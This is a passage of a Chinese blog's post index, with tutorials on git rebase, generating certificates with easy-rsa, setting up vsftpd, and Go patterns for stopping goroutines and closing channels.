更像一条直线,更优雅.\n\n \n\n\n\n## Rebase -基础用法\n\n以下我们用一个情境示范rebase的「基础用法」：\n\n> 你是一位team leader，你的其中一项职务就是负责进行程式码审查(code review)，并且将不同程式分支进行合并管理。\n>\n> 现在有2位程式设计师以develop分支为基础，分别开了新的分支feature-a与feature-b，也都已经完工了。你希望利用rebase的方式将这2个分支并入develop中。\n\n 首先，develop的日志如下所示：\n\n```\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n接着，feature-a的日志如下所示:\n\n```\ncommit 15bf9c8954633700211f5b9d246ae67d8135cf29\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n最后是feature-b的日志：\n\n```\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n可以看到feature-a与feature-b分别比develop多出了1, 2个提交。\n\n\n\n身为一名专业的team leader，我们有着足够的信心，相信这2个分支运作的很好，因此我们用以下指令进行rebase。\n\n```\n$ git checkout develop\n$\n$ git rebase feature-a\nFirst, rewinding head to replay your work on top of it...\nFast-forwarded develop to feature-a.\n$\n$ git rebase feature-b\nFirst, rewinding head to replay your work on top of it...\nApplying: add feature_a.c\n```\n\n在上述指令中，我们先切换到develop分支中，接着我们很快的就利用指令git rebase <newbase>合并了feature-a与feature-b。此外，在上述的指令执行结果中，可以看到一行讯息显示Fast-forwarded develop to feature-a，其中的Fast-forwarded是什么意思呢？\n\n> Fast-forwarded指的就是当2个分支的头尾相接时，代表2者之间不会有conflict ，因此只要改HEAD的指向就能够迅速合并了。以本情境为例，develop的最后一个提交正好是feature-a的头，所以这两者的rebase适用Fast-forwarded模式。\n\n接下来，可以用git log看看develop的日志，我们可以从日志中发现feature-a与feature-b的commit ID都不一样了。\n\n```\n$ git log\ncommit 07ef0b8e0b1edd079fb8b69f6e6e215725b5aba4\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n以上就是最简单的rebase过程。\n\n但是在这过程中，有些人可能产生了几个疑问——「为什么先rebase feature-a再rebase feature-b后，会是feature-a的日志在最上方呢？」\n\n这是由于rebase会先找出与newbase之间最近的一个共同base，然后先保留HEAD所在分支(也就是当前分支)从共同base开始的所有变更，接着从共同base开始，将newbase的变更重新套用到HEAD的所在分支后，再将方才所保留的当前分支变更一个一个套用进来，也因此feature-a会是最后的一个commit。\n\n\n\n我们一样以图示进行说明。下图**After rebase feature-a**是rebase feature-a之后的样子，可以看到rebase feature-a之后develop与feature-b的共同base是commit 38844b，因此如果要再rebase feature-b的话，commit 15bf9c会先被暂存起来，先进行rebase feature-b之后，再将刚刚暂存的commit 38844b重演一次，所以在图**After rebase feature-b**中feature-a的commit ID就从338844b变成07ef0b，这就是rebase的过程了。\n\n\n\n![1](不会rebase就等于没学过Git/3.png)\n\nAfter rebase feature-a\n\n\n\n\n\n![1](不会rebase就等于没学过Git/4.png)\n\nAfter rebase feature-b\n\n\n\n\n\n问题又来了，刚刚学的rebase会将整个分支都接上去，有时候我们不需要整个分支都接上去，只要接到分支上的某个提交的点即可，这种情况下可以使用rebase – onto进行。\n\n假设只需要接到feature-b的commit eb6436时，就可以用以下指令进行rebase：\n\n```\n$ git rebase feature-b --onto eb6436\n```\n\n又或者，想要把我们现在的分支整个接到某个分支点上面时，可以选择另一种用法：\n\n```\n$ git rebase --onto <new base-commit> <current base-commit>\n```\n\n例如，我们在feature-b分支上时，想把整个分支接到commit 3908e6 (initial commit)时，可以输入以下指令：\n\n```\n$ git co feature-b #先切换到feature-b\n$ git rebase --onto 3908e6 38844b\n```\n\n下面2 张图就是执行上述指令的前后对照。\n\n![1](不会rebase就等于没学过Git/5.png)\n\nbefore rebase –onto 3908e6 38844b\n\n\n\n![1](不会rebase就等于没学过Git/6.png)\n\nafter rebase –onto 3908e6 38844b\n\n\n\n\n\n## Rebase -进阶互动模式\n\nRebase的互动模式十分强大，可以允许我们交换提交的次序、修改提交内容、合并提交内容，甚至将一个提交拆解成多个提交。\n\n要进入互动模式的基本指令如下，base commit可以是分支上的任意一点：\n\n```\n$ git rebase -i <base commit>\n```\n\n例如，我们想利用互动模式将feature-b上的提交做一些整理时，就可以用以下指令进入互动模式：\n\n```\n$ git rebase -i 38844b\n```\n\n上述指令的意思就是我们希望将feature-b从commit 38844b之后的所有提交(`不含commit 38844b `)进行整理。\n\n接着就会出现类似以下的讯息：\n\n```\npick 1011f14 add feature_b.c\npick d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n在进一步操作前，我们必须对讯息上的几个指令(commands)进行说明：\n\n| pick:   | 保留此提交                                                   |\n| ------- | ------------------------------------------------------------ |\n| reword: | 修改提交的讯息(只改提交讯息)                                 |\n| edit:   | 保留此提交，但是需要做一些修改(例如在程式里面多加些注解)     |\n| squash: | 保留此提交，但是将上面的提交一并并入此提交，此动作会显示提交讯息供人编辑 |\n| fixup:  | 与squash相似，但是此提交的提交讯息会被上面的提交讯息取代     |\n| exec:   | 执行shell指令，例如**exec make test**进行一些测试，可以随意穿插在提交点之间 |\n\n### 变换顺序\n\n接下来，简单示范变换提交的顺序，此处我们想把提交的顺序变成先commit 1011f14再来才是commit d26076a，我们只要简单将上述的rebase讯息换成如下的讯息，也就是两行互换即可，就能够变换顺序了！\n\n```\n# 此处调换次序即可\npick d26076a add #include <stdio.h>\npick 1011f14 add feature_b.c\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n### 修改提交内容\n\n有些时候，我们提交之后，不免会注解忘了加或是程式内还有测试的code忘记清掉。这时候除了用git reset –soft HEAD^之外，也可以用rebase编辑那些需要修正的提交。\n\n例如，我们希望用rebase在commit 1011f14中添加几个提交，就可以将pick改成edit进入编辑状态。\n\n```\npick 1011f14 add feature_b.c\nedit d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n接下来，如果用git status就可以看到我们正在rebase的讯息：\n\n```\n$ git status\nrebase in progress; onto 38844ba\nYou are currently editing a commit while rebasing branch 'Feature-B' on '38844ba'.\n  (use \"git commit --amend\" to amend the current commit)\n  (use \"git rebase --continue\" once you are satisfied with your changes)\n\nnothing to commit, working directory clean\n```\n\n**如果你只是想修正提交讯息**，就可以用以下指令：\n\n```\n$ git commit --amend\n```\n\n**如果你需要多增加几个提交，直接编辑吧**，接着用git add <file> , git commit -m <message>等一般操作进行。最后再利用以下指令完成rebase：\n\n```\n$ git rebase --continue\n```\n\n**又或者，我们现在编辑的提交实在是太大了，可能对程式码审查的人造成困扰，例如同时修正太多个档案，我们希望拆成比较明确的多个提交**，就可以用以下指令回到未提交前的状态：\n\n```\n$ git reset HEAD^\n```\n\n然后就可以用git status列出这个提交中变更了多少档案，然后依照需求一个一个用git add加进去后提交，多提交个几次，就等于是将一个提交拆成多个提交啰！不过别忘了，要用以下指令结束rebase。\n\n```\n$ git rebase --continue\n```\n\n以上就是rebase的几个简单说明与操作。\n\n至于squash , fixup以及exec就留给各位去体验了！\n\n\n\n## Rebase出现问题时的处理方法\n\nRebase与merge一样都可能会产生**conflict**，这时候除了修正**conflict**之后再用git add <file> , git rebase –continue完成rebase之外，也可以用git rebase –abort直接放弃rebase。\n\n```\ngit rebase (--continue | --abort | --skip)\n```\n\n此外，对于rebase使用不慎时，我们会希望能够直接回复到rebase之前的状态，以下就是几个指令可以用来回复到rebase之前的状态。参考自[StackOverFlow](http://stackoverflow.com/questions/134882/undoing-a-git-rebase)。\n\n回复方法1 ：\n\n```\n# 最简单的用法\n$ git reset --hard ORIG_HEAD\n```\n\n回复方法2 ：\n\n```\n# rebase 之前先上tag\n$ git tag BACKUP\n$ ... # rebase 过程\n$ ... # rebase 过程\n$ git reset --hard BACKUP # 失败的话可以直接回复到tag BACKUP\n```\n\n回复方法3 ：\n\n```\n$ git reflog # 寻找要回复的HEAD ，以下假设是HEAD@{3}\n$ git reset --hard HEAD@{3} # 回复\n```","tags":["git"],"categories":["git"]},{"title":"esayrsa生成ssl证书","url":"%2Fp%2Fdf25a0d8.html","content":"\n### 下载release版本\n\nhttps://github.com/OpenVPN/easy-rsa/releases\n\n### 配置公钥基础设施变量\n\n```\ncp vars.example vars\nvim vars\n```\n\n修改内容示例\n\n```\nset_var EASYRSA_REQ_COUNTRY \"CN\"\nset_var EASYRSA_REQ_PROVINCE \"BeiJing\"\nset_var EASYRSA_REQ_CITY \"BeiJing\"\nset_var EASYRSA_REQ_ORG \"Wise Innovation Inc.\"\nset_var EASYRSA_REQ_EMAIL \"user@mail.com\"\nset_var EASYRSA_REQ_OU \"Wise Innovation\"\n```\n\n<!-- more -->\n\n### 初始化 easyrsa\n\n1. 初始化\n\n```\n./easyrsa init-pki      # pki/{reqs,private} dir\n```\n\n2.  生成 crt\n\n\n```\n./easyrsa build-ca      # pki/private/ca.key pki/ca.crt\n```\n\n输入密码\n\n\nEnter PEM pass phrase:\n\n\n确认密码\n\n\nVerifying - Enter PEM pass phrase:\n\n\n输入 CA 的名称, 如: Wise Innovation CA\n\n\nCommon Name (eg: your user, host, or server name)[Easy-RSA CA]:\n\n\n\n### 生成server证书 (因为用了通配符, 在 zsh 好像无效, 用 bash 执行命令)\n\n```\n./easyrsa build-server-full *.fhyx.online nopass  //用bash\n```\n\n\n\n   ### 生成client证书\n\n```\n./easyrsa build-client-full kc-spring-001 nopass \n\n./easyrsa build-client-full kc-box-001 nopass\n```","tags":["https"],"categories":["https"]},{"title":"linux开启ftp服务和golang实现ftp_server_client","url":"%2Fp%2Fd43abcbd.html","content":"\n\n\n### linux 安装 ftp 服务\n\n1 . 安装ftp\n\n```\nsudo apt-get install vsftpd\n```\n\n2. 修改配置  sudo vi /etc/vsftpd.con\n\n```\nlocal_root=/home/ftpuser\nwrite_enable=YES\nanon_mkdir_write_enable=YES\n```\n\n\n3. 添加ftp用户\n\n```\nmkdir /home/ftpuser\nsudo useradd -d /root/workspace -M ftpuser\nsudo passwd ftpuser\n```\n\n4. 调整文件夹权限\n\n```\nchown ftpuser:ftpuser  /home/ftpuser/\nsudo chmod a-w  /home/ftpuser \n```\n\n5. 修改pam.d/vsftpd\n\n```\nsudo vi /etc/pam.d/vsftpd\n#auth    required pam_shells.so //注释掉这一行\nsudo service vsftpd restart\n```\n\n6. 连接\n\n```\nftp://207.246.80.69  //通过浏览器访问\n\nmac 可以下载 filezilla 客户端进行连接\n```\n\n<!-- more -->\n\n## golang 实现 ftp-server ftp-client\n\n### server\n\nhttps://github.com/fclairamb/ftpserver \n\n### client\n\nhttps://github.com/secsy/goftp\n\nhttps://github.com/jlaffaye/ftp\n\n### io progress\n\nhttps://github.com/mitchellh/ioprogress\n\n#### 注意事项:\n\n+ 显示进度的时候要确定总的size\n\n+ 在显示进度的时候要注意设置断点续传的进度\n\n+ 列出file的名字\n\n","tags":["golang"],"categories":["golang"]},{"title":"golang优雅的等待或通知goroutine退出","url":"%2Fp%2Faca47db0.html","content":"\n\n\n### 优雅的等待goroutine退出\n\n\n\n#### 通过Channel传递退出信号\n\nGo的一大设计哲学就是：通过Channel共享数据，而不是通过共享内存共享数据。主流程可以通过channel向任何goroutine发送停止信号，就像下面这样：\n\n\n\n这种方式可以实现优雅地停止goroutine，但是当goroutine特别多的时候，这种方式不管在代码美观上还是管理上都显得笨拙不堪。\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"time\"\n)\n\nfunc run(done chan int) {\n   for {\n      select {\n      case <-done:\n         fmt.Println(\"exiting...\")\n         done <- 1\n         break\n      default:\n      }\n\n      time.Sleep(time.Second * 1)\n      fmt.Println(\"do something\")\n   }\n}\n\nfunc main() {\n   c := make(chan int)\n\n   go run(c)\n\n   fmt.Println(\"wait\")\n   time.Sleep(time.Second * 5)\n\n   c <- 1\n   <-c\n\n   fmt.Println(\"main exited\")\n}\n```\n\n<!-- more -->\n\n#### 使用Waitgroup\n\n通常情况下，我们像下面这样使用waitgroup:\n\n1. 创建一个Waitgroup的实例，假设此处我们叫它wg\n2. 在每个goroutine启动的时候，调用wg.Add(1)，这个操作可以在goroutine启动之前调用，也可以在goroutine里面调用。当然，也可以在创建n个goroutine前调用wg.Add(n)\n3. 当每个goroutine完成任务后，调用wg.Done()\n4. 在等待所有goroutine的地方调用wg.Wait()，它在所有执行了wg.Add(1)的goroutine都调用完wg.Done()前阻塞，当所有goroutine都调用完wg.Done()之后它会返回。\n\n那么，如果我们的goroutine是一匹不知疲倦的牛，一直孜孜不倦地工作的话，如何在主流程中告知并等待它退出呢？像下面这样做：\n\n\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"os\"\n   \"os/signal\"\n   \"sync\"\n   \"syscall\"\n)\n\ntype Service struct {\n   // Other things\n\n   ch        chan bool\n   waitGroup *sync.WaitGroup\n}\n\nfunc NewService() *Service {\n   s := &Service{\n      // Init Other things\n      ch:        make(chan bool),\n      waitGroup: &sync.WaitGroup{},\n   }\n\n   return s\n}\n\nfunc (s *Service) Stop() {\n   close(s.ch)\n   s.waitGroup.Wait()\n}\n\nfunc (s *Service) Serve() {\n   s.waitGroup.Add(1)\n   defer s.waitGroup.Done()\n\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n      s.waitGroup.Add(1)\n      go s.anotherServer()\n   }\n}\nfunc (s *Service) anotherServer() {\n   defer s.waitGroup.Done()\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n\n      // Do something\n   }\n}\n\nfunc main() {\n\n   service := NewService()\n   go service.Serve()\n\n   // Handle SIGINT and SIGTERM.\n   ch := make(chan os.Signal)\n   signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)\n   fmt.Println(<-ch)\n\n   // Stop the service gracefully.\n   service.Stop()\n}\n```\n\n\n\n### 优雅的通知 goroutine 退出\n\n\n\n有时候我们需要通知goroutine停止它正在干的事情，比如一个正在执行计算的web服务，然而它的客户端已经断开了和服务端的连接。\n\nGo语言并没有提供在一个goroutine中终止另一个goroutine的方法，由于这样会导致goroutine之间的共享变量落在未定义的状态上。\n\n在rocket launch程序中，我们往名字叫abort的channel里发送了一个简单的值，在countdown的goroutine中会把这个值理解为自己的退出信号。但是如果我们想要退出两个或者任意多个goroutine怎么办呢？\n\n\n\n一种可能的手段是向abort的channel里发送和goroutine数目一样多的事件来退出它们。如果这些goroutine中已经有一些自己退出了，那么会导致我们的channel里的事件数比goroutine还多，这样导致我们的发送直接被阻塞。另一方面，如果这些goroutine又生成了其它的goroutine，我们的channel里的数目又太少了，所以有些goroutine可能会无法接收到退出消息。一般情况下我们是很难知道在某一个时刻具体有多少个goroutine在运行着的。\n\n\n\n另外，当一个goroutine从abort channel中接收到一个值的时候，他会消费掉这个值，这样其它的goroutine就没法看到这条信息。为了能够达到我们退出goroutine的目的，我们需要更靠谱的策略，来通过一个channel把消息广播出去，这样goroutine们能够看到这条事件消息，并且在事件完成之后，可以知道这件事已经发生过了。\n\n\n\n回忆一下我们关闭了一个channel并且被消费掉了所有已发送的值，操作channel之后的代码可以立即被执行，并且会产生零值。我们可以将这个机制扩展一下，来作为我们的广播机制：***不要向channel发送值，而是用关闭一个channel来进行广播。***\n\n\n\n\n\n### 优雅的控制 goroutine 退出\n\n通常`Goroutine`会因为两种情况阻塞：\n\n1. IO操作，比如对`Socket`的`Read`。\n2. `channel`操作。对一个chan的读写都有可能阻塞`Goroutine`。\n\n\n\n对于情况1，只需要关闭对应的描述符，阻塞的`Goroutine`自然会被唤醒。\n\n重点讨论情况2。并发编程，`Goroutine`提供一种`channel`机制，`channel`类似管道，写入者向里面写入数据，读取者从中读取数据。如果`channel`里面没有数据，读取者将阻塞，直到有数据；如果`channel`里面数据满了，写入者将因为无法继续写入数据而阻塞。\n\n如果在整个应用程序的生命周期里，writer和reader都表现为一个`Goroutine`，始终都在工作，那么如何在应用程序结束前，通知它们终止呢？在Go中，并不推荐像abort线程那样，强行的终止`Goroutine`。因此，抽象的说，必然需要保留一个入口，能够跟writer或reader通信，以告知它们终止。\n\n \n\n\n\n我们先看reader。我们首先可以想到，利用`close`函数关闭正在读取的`channel`，从而可以唤醒reader，并退出。但是考虑到`close`并不能很好的处理writer（因为writer试图写入一个已经close的channel，将引发异常）。因此，我们需要设计一个额外的只读`channel`用于通知：\n\n```\ntype routineSignal struct {\n    done <-chan struct{}\n}\n```\n\n `routineSignal`的实例，应当通过外部生成并传递给reader，例如：\n\n```\nfunc (r *reader)init(s *routineSignal) {\n    r.signal = s\n}\n```\n\n 在reader的循环中，就可以这么写：\n\n```\nfunc (r *reader)loop() {\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\n当需要终止`Goroutine`的时候只需要关闭这个额外的`channel`：\n\n```\nclose(signal.done)\n```\n\n \n\n\n\n看起来很完备了，这可以处理大部分的情况了。这样做有个弊端，尽管，我们可以期望`close`唤醒`Goroutine`进而退出，但是并不能知道`Goroutine`什么时候完成退出，因为`Goroutine`可能在退出前还有一些善后工作，这个时候我们需要`sync.WaitGroup`。改造一下`routineSignal`：\n\n\n\n```\ntype routineSignal struct {\n    done chan struct{}\n    wg   sync.WaitGroup\n}\n```\n\n\n\n增加一个sync.WaitGroup的实例，在`Goroutine`开始工作时，对wg加1，在`Goroutine`退出前，对wg减1：\n\n```\nfunc (r *reader)loop() {\n    r.signal.wg.Add(1)\n    defer r.signal.wg.Done()\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    }\n}\n```\n\n 外部，只需要等待`WaitGroup`返回即可：\n\n```\nclose(signal.done)\nsignal.wg.Wait()\n```\n\n只要`Wait()`返回就能断定`Goroutine`结束了。\n\n\n\n推导一下，不难发现，对于writer也可以采用这种方法。于是，总结一下，我们创建了一个叫`routineSignal`的结构，结构里面包含一个`chan`用来通知`Goroutine`结束，包含一个`WaitGroup`用于`Goroutine`通知外部完成善后。这样，通过这个结构的实例优雅的终止`Goroutine`，而且还可以确保`Goroutine`终止成功。 ","tags":["golang"],"categories":["golang"]},{"title":"golang优雅的关闭channel","url":"%2Fp%2F8b210700.html","content":"\n\n\n### Channel使用规范\n\n在不能更改channel状态的情况下，没有简单普遍的方式来检查channel是否已经关闭了\n\n关闭已经关闭的channel会导致panic，所以在closer(关闭者)不知道channel是否已经关闭的情况下去关闭channel是很危险的\n\n发送值到已经关闭的channel会导致panic，所以如果sender(发送者)在不知道channel是否已经关闭的情况下去向channel发送值是很危险的\n\n \n\n### The Channel Closing Principle\n\n在使用Go channel的时候，一个适用的原则是*不要从接收端关闭channel，也不要关闭有多个并发发送者的channel*。\n\n换句话说，如果sender(发送者)只是唯一的sender或者是channel最后一个活跃的sender，那么你应该在sender的goroutine关闭channel，从而通知receiver(s)(接收者们)已经没有值可以读了。维持这条原则将保证永远不会发生向一个已经关闭的channel发送值或者关闭一个已经关闭的channel。\n\n<!-- more -->\n\n### 打破Channel Closing Principle的解决方案 \n\n \n\n如果你因为某种原因从接收端（receiver side）关闭channel或者在多个发送者中的一个关闭channel，那么你应该使用列在[Golang panic/recover Use Cases](https://link.jianshu.com/?t=http://www.tapirgames.com/blog/golang-panic-use-cases)的函数来安全地发送值到channel中（假设channel的元素类型是T）\n\n \n\n```\nfunc SafeSend(ch chan T, value T) (closed bool) {\n    defer func() {\n        if recover() != nil {\n            // the return result can be altered \n            // in a defer function call\n            closed = true\n        }\n    }()\n    \n    ch <- value // panic if ch is closed\n    return false // <=> closed = false; return\n}\n```\n\n \n\n同样的想法也可以用在从多个goroutine关闭channel中：\n\n\n\n```\nfunc SafeClose(ch chan T) (justClosed bool) {\n\tdefer func() {\n\t\tif recover() != nil {\n\t\t\tjustClosed = false\n\t\t}\n\t}()\n\t\n\t// assume ch != nil here.\n\tclose(ch) // panic if ch is closed\n\treturn true // <=> justClosed = true; return\n}\n```\n\n\n\n很多人喜欢用`sync.Once`来关闭channel：\n\n```\n type MyChannel struct {\n\tC    chan T\n\tonce sync.Once\n}\n\nfunc NewMyChannel() *MyChannel {\n\treturn &MyChannel{C: make(chan T)}\n}\n\nfunc (mc *MyChannel) SafeClose() {\n\tmc.once.Do(func() {\n\t\tclose(mc.C)\n\t})\n}\n```\n\n\n\n要知道golang的设计者不提供SafeClose或者SafeSend方法是有原因的，他们本来就不推荐在消费端或者在并发的多个生产端关闭channel，比如关闭只读channel在语法上就彻底被禁止使用了。\n\n \n\n### 优雅的关闭Channel的方法\n\n上文的SafeSend方法一个很大的劣势在于它不能用在select块的case语句中。而另一个很重要的劣势在于像我这样对代码有洁癖的人来说，使用panic/recover和sync/mutex来搞定不是那么的优雅。下面我们引入在不同的场景下可以使用的纯粹的优雅的解决方法。\n\n \n\n#### 多个消费者，单个生产者。\n\n这种情况最简单，直接让生产者关闭channel好了。 \n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 100\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\n\tdataCh := make(chan int, 100)\n\t\n\t// 一个生产者\n\tgo func() {\n\t\tfor {\n\t\t\tif value := rand.Intn(MaxRandomNumber); value == 0 {\n\t\t\t\tclose(dataCh)\n\t\t\t\treturn\n\t\t\t} else {\t\t\t\n\t\t\t\tdataCh <- value\n\t\t\t}\n\t\t}\n\t}()\n\t\n\t// 多个消费者\n\tfor i := 0; i < NumReceivers; i++ {\n\t\tgo func() {\n\t\t\tdefer wgReceivers.Done()\n\t\t\t\n\t\t\tfor value := range dataCh {\n\t\t\t\tlog.Println(value)\n\t\t\t}\n\t\t}()\n\t}\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\n#### 多个生产者，单个消费者。\n\n这种情况要比上面的复杂一点。我们不能在消费端关闭channel，因为这违背了channel关闭原则。但是我们可以让消费端关闭一个附加的信号来通知发送端停止生产数据。\n\n\n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(1)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{})\n\t\n\t\n\t// 多个生产者\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func() {\n\t\t\tfor {\n\t\t\n\t\t\t\t// 目的是尝试退出, 因为越早越好, 此处可以省略, 因为就算多发送了值, 消费者也不会理会了\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- rand.Intn(MaxRandomNumber):\n\t\t\t\t}\n\t\t\t}\n\t\t}()\n\t}\n\t\n\t// 一个消费者\n\tgo func() {\n\t\tdefer wgReceivers.Done()\n\t\t\n\t\tfor value := range dataCh {\n\t\t\tif value == MaxRandomNumber-1 {\n\t\t\t\t\n\t\t\t\t// 这里即是dataCh 的消费者, 也是 stopCh 的生产者\n\t\t\t\tclose(stopCh)\n\t\t\t\treturn\n\t\t\t}\n\t\t\t\n\t\t\tlog.Println(value)\n\t\t}\n\t}()\n\t\n\t\n\twgReceivers.Wait()\n}\n```\n\n\n\n就上面这个例子，生产者同时也是退出信号channel的接受者，退出信号channel仍然是由它的生产端关闭的，所以这仍然没有违背**channel关闭原则**。值得注意的是，这个例子中生产端和接受端都没有关闭消息数据的channel，channel在没有任何goroutine引用的时候会自行关闭，而不需要显示进行关闭。\n\n \n\n####  多个生产者，多个消费者\n\n \n\n这是最复杂的一种情况，我们既不能让接受端也不能让发送端关闭channel。我们甚至都不能让接受者关闭一个退出信号来通知生产者停止生产。因为我们不能违反**channel关闭原则**。但是我们可以引入一个额外的协调者来关闭附加的退出信号channel。  \n\n \n\n```\npackage main\n\nimport (\n\t\"time\"\n\t\"math/rand\"\n\t\"sync\"\n\t\"log\"\n\t\"strconv\"\n)\n\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\tlog.SetFlags(0)\n\t\n\n\tconst MaxRandomNumber = 100000\n\tconst NumReceivers = 10\n\tconst NumSenders = 1000\n\t\n\twgReceivers := sync.WaitGroup{}\n\twgReceivers.Add(NumReceivers)\n\t\n\t\n\tdataCh := make(chan int, 100)\n\tstopCh := make(chan struct{}) //生产者是主持人, 消费者是 (dataCh所有生产者和消费者)\n\t\n\ttoStop := make(chan string, 1) //作用是通知主持人去关闭stopCh, 生产者是 (dataCh所有生产者和消费者) 消费者是主持人\n\t\t\n\t\n\tvar stoppedBy string\n\t\n\t// 主持人\n\tgo func() {\n\t\tstoppedBy = <- toStop\n\t\tclose(stopCh)\n\t}()\n\t\n\t// 多个生产者\n\tfor i := 0; i < NumSenders; i++ {\n\t\tgo func(id string) {\n\t\t\tfor {\n\t\t\t\tvalue := rand.Intn(MaxRandomNumber)\n\t\t\t\tif value == 0 {\n\t\t\t\t\t//通知主持人去干关闭的活\n\t\t\t\t\tselect {\n\t\t\t\t\tcase toStop <- \"sender#\" + id:\n\t\t\t\t\tdefault:\n\t\t\t\t\t}\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\n                //尝试尽早退出, 这里不能省略, 因为可能会导致多发送一次\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tdefault:\n\t\t\t\t}\n\t\t\t\t\n\n\t\t\t\tselect {\n\t\t\t\tcase <- stopCh:\n\t\t\t\t\treturn\n\t\t\t\tcase dataCh <- value:\n\t\t\t\t}\n\t\t\t}\n\t\t}(strconv.Itoa(i))\n\t}\n\t\n\t// 多个消费者\n\tfor i 